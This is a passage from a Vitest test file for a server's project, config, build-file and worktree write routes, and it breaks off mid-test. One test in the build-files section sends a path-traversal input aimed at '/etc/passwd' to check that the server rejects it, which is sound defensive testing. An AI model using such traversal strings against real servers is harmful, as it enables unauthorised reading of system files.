import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import fs from 'node:fs/promises'
import path from 'node:path'
import { createTempDataDir, cleanupTempDir } from '@yaac/test-utils/setup'
import { buildApp } from '@yaac/server/main/server'
import { git } from '@yaac/test-utils/git'
import { projectConfigDir, getProjectsDir, projectDir, claudeDir, codexDir, repoDir } from '@yaac/shared/project-paths'
import { cloneRepo } from '@yaac/server/domain/git'
import { addHttpsCredential, assignProjectCredential, listCredentialSummaries } from '@yaac/server/domain/projects/credentials'
import {
  loadClaudeCredentialsFile,
  saveClaudeOAuthBundle,
} from '@yaac/shared/tool-auth'
import { getProjectWorktreeRows, recordWorktreeCreated } from '@yaac/server/db/worktree-store'
import { getProjectRow, recordProject } from '@yaac/server/db/project-store'
import { listWorktreeGroups } from '@yaac/server/domain/worktrees/groups'
import { MAX_TITLE_LENGTH } from '@yaac/shared/titles'
import { closeDb } from '@yaac/server/db/client'
import type * as sessionCreateModule from '@yaac/server/domain/worktrees/create'
import type * as projectAddModule from '@yaac/server/domain/projects/add'
import type * as sessionDeleteModule from '@yaac/server/domain/worktrees/stop'
import type * as sessionRestartModule from '@yaac/server/domain/worktrees/restart'
import type * as projectRemoveModule from '@yaac/server/domain/worktrees/project-teardown'
import type * as cliResolveModule from '@yaac/auth-daemon/cli-resolve'
import type { ProjectMeta, ClaudeOAuthBundle } from '@yaac/shared/types'
import { ServerError } from '@yaac/shared/errors'
import { makeTestApiClient } from '@yaac/test-utils/api'
import { worktreeDriver } from '@yaac/server/drivers/driver'

vi.mock('@yaac/server/domain/worktrees/create', async () => {
  const actual = await vi.importActual<typeof sessionCreateModule>('@yaac/server/domain/worktrees/create')
  return {
    ...actual,
    createWorktree: vi.fn(),
  }
})

vi.mock('@yaac/server/domain/worktrees/stop', () => ({
  stopWorktree: vi.fn(),
} satisfies Partial<typeof sessionDeleteModule>))

vi.mock('@yaac/server/domain/worktrees/restart', () => ({
  restartWorktree: vi.fn(),
} satisfies Partial<typeof sessionRestartModule>))

vi.mock('@yaac/server/domain/projects/add', async () => {
  const actual = await vi.importActual<typeof projectAddModule>('@yaac/server/domain/projects/add')
  return {
    ...actual,
    addProject: vi.fn(),
  }
})

vi.mock('@yaac/server/domain/worktrees/project-teardown', () => ({
  removeProject: vi.fn(),
} satisfies Partial<typeof projectRemoveModule>))

// The install flow's post-exit verification resolves the CLI on the real
// machine — mocked so the route tests pass regardless of what's installed.
vi.mock('@yaac/auth-daemon/cli-resolve', async () => {
  const actual = await vi.importActual<typeof cliResolveModule>('@yaac/auth-daemon/cli-resolve')
  return {
    ...actual,
    resolveToolCliPath: () => '/fake/bin/tool',
  }
})

import { createWorktree } from '@yaac/server/domain/worktrees/create'
import { stopWorktree } from '@yaac/server/domain/worktrees/stop'
import { restartWorktree } from '@yaac/server/domain/worktrees/restart'
import { addProject } from '@yaac/server/domain/projects/add'
import { removeProject } from '@yaac/server/domain/worktrees/project-teardown'
import { registerProvisioning, listProvisioning, clearAllProvisioningForTests } from '@yaac/server/domain/worktrees/provisioning'
import { authAgentHub } from '@yaac/server/domain/auth/agent'
import type { AgentOp } from '@yaac/shared/auth-agent-protocol'
import { CLAUDE_STUB, CODEX_STUB, INSTALL_STUB } from '@yaac/test-utils/fixtures'
import {
  cancelToolLogin,
  clearAllToolLoginsForTests,
  getToolLogin,
  sendToolLoginInput,
  startToolLogin,
} from '@yaac/auth-daemon/tool-login'
import {
  cancelToolInstall,
  clearAllToolInstallsForTests,
  getToolInstall,
  startToolInstall,
} from '@yaac/auth-daemon/tool-install'

/**
 * Wire an in-process "loopback" auth agent into the hub: ops dispatch to
 * the real local login/install managers and a pump pushes their views
 * back, so the routes get full end-to-end coverage without a WebSocket.
 * Returns a teardown that must run in afterEach.
 */
function installLoopbackAgent(): () => void {
  const tracked = new Map<string, 'login' | 'install'>()
  authAgentHub.setSocket({
    send: (data: string) => {
      const op = JSON.parse(data) as AgentOp
      if (op.op === 'start') {
        tracked.set(op.id, op.kind)
        if (op.kind === 'login') void startToolLogin(op.tool, op.id)
        else startToolInstall(op.tool, op.id)
      } else if (op.op === 'input') {
        try {
          sendToolLoginInput(op.id, op.text)
        } catch { /* surfaces via the next view push */ }
      } else {
        if (op.kind === 'login') cancelToolLogin(op.id)
        else cancelToolInstall(op.id)
        tracked.delete(op.id)
      }
    },
    close: () => {},
  })
  const pump = setInterval(() => {
    for (const [id, kind] of tracked) {
      try {
        const view = kind === 'login' ? getToolLogin(id) : getToolInstall(id)
        authAgentHub.ingest(JSON.stringify({ op: 'view', kind, view }))
        if (view.status !== 'running') tracked.delete(id)
      } catch {
        tracked.delete(id)
      }
    }
  }, 25)
  return () => {
    clearInterval(pump)
    authAgentHub.clearForTests()
  }
}

const mockCreateWorktree = vi.mocked(createWorktree)
const mockDeleteSession = vi.mocked(stopWorktree)
const mockRestartSession = vi.mocked(restartWorktree)
const mockAddProject = vi.mocked(addProject)
const mockRemoveProject = vi.mocked(removeProject)

const SAMPLE_BUNDLE: ClaudeOAuthBundle = {
  accessToken: 'sk-ant-oat01-real',
  refreshToken: 'sk-ant-ort01-real',
  expiresAt: 9999999999999,
  scopes: ['user:inference'],
}

// Raw-request helper for the edge-case tests that intentionally send
// payloads the RPC client's type layer would reject (missing fields,
// malformed JSON, out-of-enum values).
function withAuth(init: RequestInit = {}): RequestInit {
  const headers = new Headers(init.headers ?? {})
  headers.set('authorization', 'Bearer shh')
  if (init.body !== undefined) headers.set('content-type', 'application/json')
  return { ...init, headers }
}

async function writeProject(slug: string, remoteUrl = 'https://example.com/foo'): Promise<void> {
  const dir = path.join(getProjectsDir(), slug)
  await fs.mkdir(dir, { recursive: true })
  const meta: ProjectMeta = {
    slug,
    remoteUrl,
    addedAt: '2026-01-01T00:00:00.000Z',
  }
  await fs.writeFile(path.join(dir, 'project.json'), JSON.stringify(meta))
}

describe('write routes', () => {
  let tmpDir: string

  beforeEach(async () => {
    tmpDir = await createTempDataDir()
    vi.resetAllMocks()
    clearAllProvisioningForTests()
  })

  afterEach(async () => {
    await closeDb()
    await cleanupTempDir(tmpDir)
  })

  describe('POST /project/add', () => {
    it('rejects requests with no body', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/project/add', withAuth({ method: 'POST' }))
      expect(res.status).toBe(400)
    })

    it('rejects requests missing the remoteUrl or the git credential', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      for (const body of [{ gitCredentialId: '00000000-0000-4000-8000-000000000001' }, { remoteUrl: 'x/foo' }]) {
        const res = await app.request('/project/add', withAuth({
          method: 'POST',
          body: JSON.stringify(body),
        }))
        expect(res.status).toBe(400)
      }
    })

    it('delegates to addProject and returns 200 on success', async () => {
      mockAddProject.mockResolvedValue({
        project: { slug: 'foo', remoteUrl: 'https://github.com/x/foo', addedAt: 'now' },
        knownHostsEntry: null,
      })
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const id = '00000000-0000-4000-8000-000000000001'
      const res = await client.project.add.$post({ json: { remoteUrl: 'x/foo', gitCredentialId: id } })
      expect(res.status).toBe(200)
      expect(mockAddProject).toHaveBeenCalledWith('x/foo', id)
    })
  })

  describe('DELETE /project/:slug', () => {
    it('delegates to removeProject and returns 204', async () => {
      mockRemoveProject.mockResolvedValue(undefined)
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug'].$delete({ param: { slug: 'demo' } })
      expect(res.status).toBe(204)
      expect(mockRemoveProject).toHaveBeenCalledWith('demo')
    })
  })

  describe('PUT /project/:slug/config', () => {
    it('rejects requests with no config field', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/project/demo/config', withAuth({
        method: 'PUT',
        body: JSON.stringify({}),
      }))
      expect(res.status).toBe(400)
    })

    it('writes the config and returns it', async () => {
      await writeProject('demo')
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug'].config.$put({
        param: { slug: 'demo' },
        json: { config: { initCommands: ['pnpm install'] } },
      })
      expect(res.status).toBe(200)
      expect(await res.json()).toEqual({ config: { initCommands: ['pnpm install'] } })
      const raw = await fs.readFile(
        path.join(projectConfigDir('demo'), 'yaac-config.json'),
        'utf8',
      )
      expect(JSON.parse(raw)).toEqual({ initCommands: ['pnpm install'] })
    })
  })

  describe('DELETE /project/:slug/config', () => {
    it('returns 204 when the project exists', async () => {
      await writeProject('demo')
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug'].config.$delete({ param: { slug: 'demo' } })
      expect(res.status).toBe(204)
    })

    it('returns 404 for an unknown project', async () => {
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug'].config.$delete({ param: { slug: 'nope' } })
      expect(res.status).toBe(404)
    })
  })

  describe('project env routes', () => {
    it('round-trips a plain variable and never gives a secret back', async () => {
      await writeProject('demo')
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))

      await client.project[':slug'].env.$put({
        param: { slug: 'demo' },
        json: { name: 'NODE_ENV', value: 'development' },
      })
      await client.project[':slug'].env.$put({
        param: { slug: 'demo' },
        json: {
          name: 'API_KEY',
          value: 'sekrit',
          secret: true,
          rule: { hosts: ['api.example.com'], header: 'x-api-key' },
        },
      })

      const { vars } = await (await client.project[':slug'].env.$get({ param: { slug: 'demo' } })).json()
      expect(vars).toEqual([
        expect.objectContaining({ name: 'API_KEY', secret: true, hasValue: true }),
        expect.objectContaining({ name: 'NODE_ENV', value: 'development', secret: false }),
      ])
      // Write-only by design: the value goes in and never comes back out.
      expect(JSON.stringify(vars)).not.toContain('sekrit')
    })

    it('surfaces a rule the proxy could not act on as VALIDATION', async () => {
      await writeProject('demo')
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/project/demo/env', withAuth({
        method: 'PUT',
        body: JSON.stringify({ name: 'K', value: 'v', secret: true, rule: { hosts: [] } }),
      }))
      expect(res.status).toBe(400)
    })

    it('deletes by id, and 404s for one the project does not have', async () => {
      await writeProject('demo')
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const saved = await (await client.project[':slug'].env.$put({
        param: { slug: 'demo' },
        json: { name: 'A', value: '1' },
      })).json()

      expect((await client.project[':slug'].env[':id'].$delete({
        param: { slug: 'demo', id: '00000000-0000-4000-8000-000000000000' },
      })).status).toBe(404)

      expect((await client.project[':slug'].env[':id'].$delete({
        param: { slug: 'demo', id: saved.var.id },
      })).status).toBe(204)
      expect((await (await client.project[':slug'].env.$get({
        param: { slug: 'demo' },
      })).json()).vars).toEqual([])
    })
  })

  describe('GET/PUT /config/git-identity', () => {
    it('is null until set, then round-trips', async () => {
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      expect((await (await client.config['git-identity'].$get()).json()).identity).toBeNull()

      const saved = await (await client.config['git-identity'].$put({
        json: { name: '  Ada Lovelace ', email: ' ada@example.com ' },
      })).json()
      expect(saved.identity).toEqual({ name: 'Ada Lovelace', email: 'ada@example.com' })
      expect((await (await client.config['git-identity'].$get()).json()).identity)
        .toEqual({ name: 'Ada Lovelace', email: 'ada@example.com' })
    })

    it('refuses a half-identity or a non-address', async () => {
      // Committing as a name with no email is not a lesser identity — git
      // refuses it — so neither is this.
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      for (const body of [
        { name: 'Ada', email: '' },
        { name: '   ', email: 'ada@example.com' },
        { name: 'Ada', email: 'not-an-address' },
      ]) {
        const res = await app.request('/config/git-identity', withAuth({
          method: 'PUT',
          body: JSON.stringify(body),
        }))
        expect(res.status).toBe(400)
      }
    })
  })

  describe('project branches routes', () => {
    // A real repo behind the project: source with main + develop, cloned to
    // the project's repo dir so origin/* remote-tracking refs exist.
    async function writeProjectWithRepo(slug: string): Promise<string> {
      const sourceRepo = path.join(getProjectsDir(), `${slug}-source`)
      // The row's remote is what a refresh fetches, so it names the source.
      await writeProject(slug, sourceRepo)
      await fs.mkdir(sourceRepo, { recursive: true })
      await git(sourceRepo, ['init', '-b', 'main'])
      await git(sourceRepo, ['config', 'user.email', 't@t.co'])
      await git(sourceRepo, ['config', 'user.name', 'T'])
      await fs.writeFile(path.join(sourceRepo, 'a.txt'), 'a\n')
      await git(sourceRepo, ['add', '.'])
      await git(sourceRepo, ['commit', '-m', 'initial'])
      await git(sourceRepo, ['branch', 'develop'])
      await cloneRepo(sourceRepo, repoDir(slug), null)
      return sourceRepo
    }

    interface BranchesBody {
      branches: string[]
      defaultBranch: string
      referenceBranch: string | null
    }

    it('GET /project/:slug/branches lists branches with the default and reference branch', async () => {
      await writeProjectWithRepo('demo')
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug'].branches.$get({ param: { slug: 'demo' }, query: {} })
      expect(res.status).toBe(200)
      const body = await res.json() as BranchesBody
      expect(body.branches).toContain('main')
      expect(body.branches).toContain('develop')
      expect(body.defaultBranch).toBe('main')
      expect(body.referenceBranch).toBeNull()
    })

    it('GET /project/:slug/branches?refresh=1 fetches new branches first', async () => {
      const sourceRepo = await writeProjectWithRepo('demo')
      await git(sourceRepo, ['branch', 'feature/late'])
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug'].branches.$get({
        param: { slug: 'demo' },
        query: { refresh: '1' },
      })
      expect(res.status).toBe(200)
      expect((await res.json() as BranchesBody).branches).toContain('feature/late')
    })

    it('GET returns 404 for an unknown project', async () => {
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug'].branches.$get({ param: { slug: 'nope' }, query: {} })
      expect(res.status).toBe(404)
    })

    it('PUT /project/:slug/reference-branch sets, reflects in GET, and clears with null', async () => {
      await writeProjectWithRepo('demo')
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))

      const set = await client.project[':slug']['reference-branch'].$put({
        param: { slug: 'demo' },
        json: { branch: 'develop' },
      })
      expect(set.status).toBe(200)
      expect(await set.json()).toEqual({ referenceBranch: 'develop' })

      const get = await client.project[':slug'].branches.$get({ param: { slug: 'demo' }, query: {} })
      expect((await get.json() as BranchesBody).referenceBranch).toBe('develop')

      const cleared = await client.project[':slug']['reference-branch'].$put({
        param: { slug: 'demo' },
        json: { branch: null },
      })
      expect(cleared.status).toBe(200)
      expect(await cleared.json()).toEqual({ referenceBranch: null })
    })

    it('PUT rejects a branch that does not exist on origin', async () => {
      await writeProjectWithRepo('demo')
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug']['reference-branch'].$put({
        param: { slug: 'demo' },
        json: { branch: 'no-such-branch' },
      })
      expect(res.status).toBe(400)
      const body = await res.json() as unknown as { error: { code: string } }
      expect(body.error.code).toBe('VALIDATION')
    })

    it('PUT returns 404 for an unknown project', async () => {
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug']['reference-branch'].$put({
        param: { slug: 'nope' },
        json: { branch: 'develop' },
      })
      expect(res.status).toBe(404)
    })
  })

  describe('GET /project/:slug/dockerfile', () => {
    it('returns empty content when the project has none', async () => {
      await writeProject('demo')
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug'].dockerfile.$get({ param: { slug: 'demo' } })
      expect(res.status).toBe(200)
      expect(await res.json()).toEqual({ content: '' })
    })

    it('returns 404 for an unknown project', async () => {
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug'].dockerfile.$get({ param: { slug: 'nope' } })
      expect(res.status).toBe(404)
    })
  })

  describe('PUT /project/:slug/dockerfile', () => {
    it('rejects requests with no content field', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/project/demo/dockerfile', withAuth({
        method: 'PUT',
        body: JSON.stringify({}),
      }))
      expect(res.status).toBe(400)
    })

    it('writes the Dockerfile and returns it', async () => {
      await writeProject('demo')
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.project[':slug'].dockerfile.$put({
        param: { slug: 'demo' },
        json: { content: 'FROM ubuntu:24.04\n' },
      })
      expect(res.status).toBe(200)
      expect(await res.json()).toEqual({ content: 'FROM ubuntu:24.04\n' })
      const raw = await fs.readFile(
        path.join(projectConfigDir('demo'), 'build', 'Dockerfile.yaac'),
        'utf8',
      )
      expect(raw).toBe('FROM ubuntu:24.04\n')
    })
  })

  describe('GET/PUT /config/user-dockerfile', () => {
    it('returns empty content when unset', async () => {
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.config['user-dockerfile'].$get()
      expect(res.status).toBe(200)
      expect(await res.json()).toEqual({ content: '' })
    })

    it('writes a layered user Dockerfile and returns it', async () => {
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const content = 'ARG BASE_IMAGE\nFROM ${BASE_IMAGE}\nRUN echo hi\n'
      const res = await client.config['user-dockerfile'].$put({ json: { content } })
      expect(res.status).toBe(200)
      expect(await res.json()).toEqual({ content })
    })

    it('rejects a non-layered user Dockerfile with 400', async () => {
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.config['user-dockerfile'].$put({
        json: { content: 'FROM ubuntu:24.04\n' },
      })
      expect(res.status).toBe(400)
    })
  })

  describe('project build files', () => {
    it('round-trips save → list → read → delete', async () => {
      await writeProject('demo')
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const bf = client.project[':slug']['build-files']

      const put = await bf.file.$put({
        param: { slug: 'demo' },
        json: { path: 'nvim/init.lua', content: 'print(1)\n' },
      })
      expect(put.status).toBe(200)
      expect(await put.json()).toEqual({ path: 'nvim/init.lua', size: 9, binary: false })

      const list = await bf.$get({ param: { slug: 'demo' } })
      expect(await list.json()).toEqual({
        files: [{ path: 'nvim/init.lua', size: 9, binary: false }],
      })

      const read = await bf.file.$get({ param: { slug: 'demo' }, query: { path: 'nvim/init.lua' } })
      expect(await read.json()).toEqual({
        path: 'nvim/init.lua', size: 9, binary: false, content: 'print(1)\n',
      })

      const del = await bf.file.$delete({ param: { slug: 'demo' }, query: { path: 'nvim' } })
      expect(del.status).toBe(204)
      const relist = await bf.$get({ param: { slug: 'demo' } })
      expect(await relist.json()).toEqual({ files: [] })
    })

    it('stores a base64 upload and reads it back as binary', async () => {
      await writeProject('demo')
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const bf = client.project[':slug']['build-files']
      const bytes = Buffer.from([0, 1, 2, 3])

      const put = await bf.file.$put({
        param: { slug: 'demo' },
        json: { path: 'blob.bin', contentBase64: bytes.toString('base64') },
      })
      expect(await put.json()).toEqual({ path: 'blob.bin', size: 4, binary: true })

      const read = await bf.file.$get({ param: { slug: 'demo' }, query: { path: 'blob.bin' } })
      expect(await read.json()).toEqual({ path: 'blob.bin', size: 4, binary: true, content: null })
      const raw = await fs.readFile(path.join(projectConfigDir('demo'), 'build', 'blob.bin'))
      expect(raw.equals(bytes)).toBe(true)
    })

    it('rejects traversal, reserved names, and ambiguous bodies with 400', async () => {
      await writeProject('demo')
      const app = buildApp({ secret: 'shh', buildId: 'test' })

      const traverse = await app.request(
        '/project/demo/build-files/file?path=..%2F..%2Fetc%2Fpasswd',
        withAuth(),
      )
      expect(traverse.status).toBe(400)

      const reserved = await app.request('/project/demo/build-files/file', withAuth({
        method: 'PUT',
        body: JSON.stringify({ path: 'Dockerfile.yaac', content: 'FROM x\n' }),
      }))
      expect(reserved.status).toBe(400)

      const both = await app.request('/project/demo/build-files/file', withAuth({
        method: 'PUT',
        body: JSON.stringify({ path: 'a', content: 'x', contentBase64: 'eA==' }),
      }))
      expect(both.status).toBe(400)
    })

    it('returns 404 for an unknown project or missing file', async () => {
      await writeProject('demo')
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const bf = client.project[':slug']['build-files']
      expect((await bf.$get({ param: { slug: 'nope' } })).status).toBe(404)
      expect((await bf.file.$get({ param: { slug: 'demo' }, query: { path: 'nope' } })).status).toBe(404)
    })
  })

  describe('user build files', () => {
    it('round-trips against the user build dir', async () => {
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const bf = client.config['user-build-files']

      const put = await bf.file.$put({ json: { path: 'gitconfig', content: '[user]\n' } })
      expect(put.status).toBe(200)

      const list = await bf.$get()
      expect(await list.json()).toEqual({
        files: [{ path: 'gitconfig', size: 7, binary: false }],
      })

      const del = await bf.file.$delete({ query: { path: 'gitconfig' } })
      expect(del.status).toBe(204)
    })
  })

  describe('POST /worktree/create', () => {
    it('rejects missing project', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/worktree/create', withAuth({
        method: 'POST',
        body: JSON.stringify({}),
      }))
      expect(res.status).toBe(400)
    })

    it('rejects an unknown tool with VALIDATION', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/worktree/create', withAuth({
        method: 'POST',
        body: JSON.stringify({ project: 'demo', tool: 'mystery' }),
      }))
      expect(res.status).toBe(400)
      const body = await res.json() as { error: { code: string } }
      expect(body.error.code).toBe('VALIDATION')
    })

    // A person's create becomes the project's next defaults: the agent, and
    // whatever the request named for it — per agent, so one agent's picks
    // never move another's. A field left out keeps what was picked before.
    it('remembers the agent and what the request named for it', async () => {
      await recordProject({ slug: 'demo', remoteUrl: 'git@h:o/r.git', addedAt: 'now' })
      mockCreateWorktree.mockResolvedValue({
        worktreeId: 'sess-x', jobName: 'j', forwardedPorts: [], tool: 'claude', mode: 'tui',
      })
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const create = async (body: Record<string, unknown>): Promise<void> => {
        const res = await app.request('/worktree/create', withAuth({
          method: 'POST', body: JSON.stringify({ project: 'demo', ...body }),
        }))
        await res.text() // drain the NDJSON stream so the handler finishes
      }

      await create({ tool: 'claude', model: 'claude-sonnet-5', permissionMode: 'plan', mode: 'acp' })
      // pi's only posture is bypass; remembering it moves nothing but pi.
      await create({ tool: 'pi', permissionMode: 'bypass' })
      expect(await getProjectRow('demo')).toMatchObject({
        lastTool: 'pi',
        createDefaults: {
          claude: { model: 'claude-sonnet-5', permissionMode: 'plan', mode: 'acp' },
          pi: { permissionMode: 'bypass' },
        },
      })

      // A bare create runs the last agent with what it last used — except
      // the mode, which only the webapp (which sends it) can present.
      await create({ tool: 'claude' })
      expect(mockCreateWorktree.mock.calls.at(-1)?.[1]).toMatchObject({
        tool: 'claude', model: 'claude-sonnet-5', permissionMode: 'plan', mode: 'tui',
      })
      // ...and records nothing but the agent, so the picks stand.
      expect((await getProjectRow('demo'))?.createDefaults.claude)
        .toEqual({ model: 'claude-sonnet-5', permissionMode: 'plan', mode: 'acp' })
    })

    it('names the launch model on the provisioning row', async () => {
      await recordProject({ slug: 'demo', remoteUrl: 'git@h:o/r.git', addedAt: 'now' })
      let rowModel: unknown
      mockCreateWorktree.mockImplementation((_slug, opts) => {
        rowModel = listProvisioning().find((p) => p.worktreeId === opts.worktreeId)
        return Promise.resolve({ worktreeId: 'sess-x', jobName: 'j', forwardedPorts: [], tool: 'claude', mode: 'tui' as const })
      })
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/worktree/create', withAuth({
        method: 'POST', body: JSON.stringify({ project: 'demo', tool: 'claude', model: 'claude-opus-5-5' }),
      }))
      await res.text()
      expect(rowModel).toMatchObject({ model: 'claude-opus-5-5', modelName: 'Opus 5.5' })
    })

    it('streams progress and a terminal result event from createWorktree', async () => {
      mockCreateWorktree.mockImplementation((_slug, opts) => {
        opts.onProgress?.('Fetching latest from remote...')
        opts.onProgress?.('Creating session job yaac-demo-sess-x...')
        return Promise.resolve({
          worktreeId: 'sess-x',
          jobName: 'yaac-demo-sess-x',
          forwardedPorts: [],
          tool: 'claude',
          mode: 'tui' as const,
        })
      })
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.worktree.create.$post({
        json: {
          project: 'demo',
        },
      })
      expect(res.status).toBe(200)
      expect(res.headers.get('content-type')).toBe('application/x-ndjson')
      const text = await res.text()
      const events = text.trim().split('\n').map((line) => JSON.parse(line) as unknown)
      expect(events).toEqual([
        { type: 'progress', message: 'Fetching latest from remote...' },
        { type: 'progress', message: 'Creating session job yaac-demo-sess-x...' },
        {
          type: 'result',
          result: {
            worktreeId: 'sess-x',
            jobName: 'yaac-demo-sess-x',
            forwardedPorts: [],
            tool: 'claude',
            // Streamed verbatim, and the CLI reads it: an acp worktree must
            // not get a PTY attached after a create or a restart.
            mode: 'tui',
          },
        },
      ])
      expect(mockCreateWorktree).toHaveBeenCalledWith('demo', expect.objectContaining({
      }))
    })

    it('emits a terminal error event when createWorktree throws', async () => {
      mockCreateWorktree.mockRejectedValue(new ServerError('VALIDATION', 'no github token'))
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.worktree.create.$post({ json: { project: 'demo' } })
      expect(res.status).toBe(200)
      const events = (await res.text()).trim().split('\n').map((l) => JSON.parse(l) as unknown)
      expect(events).toEqual([
        { type: 'error', error: { code: 'VALIDATION', message: 'no github token' } },
      ])
    })

    it('threads a branch into createWorktree', async () => {
      mockCreateWorktree.mockResolvedValue({
        worktreeId: 'sess-x', jobName: 'j', forwardedPorts: [], tool: 'claude', mode: 'tui',
      })
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.worktree.create.$post({ json: { project: 'demo', branch: 'dev' } })
      expect(res.status).toBe(200)
      await res.text()
      expect(mockCreateWorktree).toHaveBeenCalledWith('demo', expect.objectContaining({ branch: 'dev' }))
    })

    it('rejects an empty branch with VALIDATION', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/worktree/create', withAuth({
        method: 'POST',
        body: JSON.stringify({ project: 'demo', branch: '' }),
      }))
      expect(res.status).toBe(400)
    })

    it('threads a client-supplied worktreeId into createWorktree', async () => {
      mockCreateWorktree.mockResolvedValue({
        worktreeId: 'sess-x', jobName: 'j', forwardedPorts: [], tool: 'claude', mode: 'tui',
      })
      const id = '11111111-1111-4111-8111-111111111111'
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.worktree.create.$post({ json: { project: 'demo', worktreeId: id } })
      expect(res.status).toBe(200)
      await res.text()
      expect(mockCreateWorktree).toHaveBeenCalledWith('demo', expect.objectContaining({ worktreeId: id }))
    })

    it('rejects a non-uuid worktreeId with VALIDATION', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/worktree/create', withAuth({
        method: 'POST',
        body: JSON.stringify({ project: 'demo', worktreeId: 'not-a-uuid' }),
      }))
      expect(res.status).toBe(400)
      const body = await res.json() as { error: { code: string } }
      expect(body.error.code).toBe('VALIDATION')
    })
  })

  describe('POST /worktree/provisioning/:id/dismiss', () => {
    it('removes the registry entry and returns 204', async () => {
      registerProvisioning({ worktreeId: 'dz-1', projectSlug: 'demo', tool: 'claude', kind: 'create' })
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.worktree.provisioning[':id'].dismiss.$post({ param: { id: 'dz-1' } })
      expect(res.status).toBe(204)
      expect(listProvisioning().some((p) => p.worktreeId === 'dz-1')).toBe(false)
    })

    it('is idempotent for an unknown id', async () => {
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.worktree.provisioning[':id'].dismiss.$post({ param: { id: 'nope' } })
      expect(res.status).toBe(204)
    })
  })

  describe('POST /worktree/restart', () => {
    it('rejects missing worktreeId', async () => {
      const app = buildApp({ secret: 'shh', buildId: 'test' })
      const res = await app.request('/worktree/restart', withAuth({
        method: 'POST',
        body: JSON.stringify({}),
      }))
      expect(res.status).toBe(400)
    })

    it('streams progress and a result event from restartWorktree', async () => {
      mockRestartSession.mockImplementation((_id, opts) => {
        opts?.onProgress?.('Stopping session job yaac-demo-sess-x...')
        opts?.onProgress?.('Reusing existing worktree at /wt/sess-x')
        return Promise.resolve({
          worktreeId: 'sess-x',
          jobName: 'yaac-demo-sess-x',
          forwardedPorts: [],
          tool: 'claude',
          mode: 'tui' as const,
        })
      })
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.worktree.restart.$post({
        json: {
          worktreeId: 'sess-x',
        },
      })
      expect(res.status).toBe(200)
      expect(res.headers.get('content-type')).toBe('application/x-ndjson')
      const events = (await res.text()).trim().split('\n').map((line) => JSON.parse(line) as unknown)
      expect(events).toEqual([
        { type: 'progress', message: 'Stopping session job yaac-demo-sess-x...' },
        { type: 'progress', message: 'Reusing existing worktree at /wt/sess-x' },
        {
          type: 'result',
          result: {
            worktreeId: 'sess-x',
            jobName: 'yaac-demo-sess-x',
            forwardedPorts: [],
            tool: 'claude',
            // Streamed verbatim, and the CLI reads it: an acp worktree must
            // not get a PTY attached after a create or a restart.
            mode: 'tui',
          },
        },
      ])
      expect(mockRestartSession).toHaveBeenCalledWith('sess-x', expect.objectContaining({
      }))
    })

    it('emits a terminal error event when restartWorktree throws', async () => {
      mockRestartSession.mockRejectedValue(new ServerError('NOT_FOUND', 'missing'))
      const client = makeTestApiClient(buildApp({ secret: 'shh', buildId: 'test' }))
      const res = await client.worktree.restart.$post({ json: { worktreeId: 'nope' } })
      expect(res.status).toBe(200)
      const events = (await res.text()).trim().split('\n').map((l) => JSON.parse(l) as unknown)
      expect(events).toEqual([
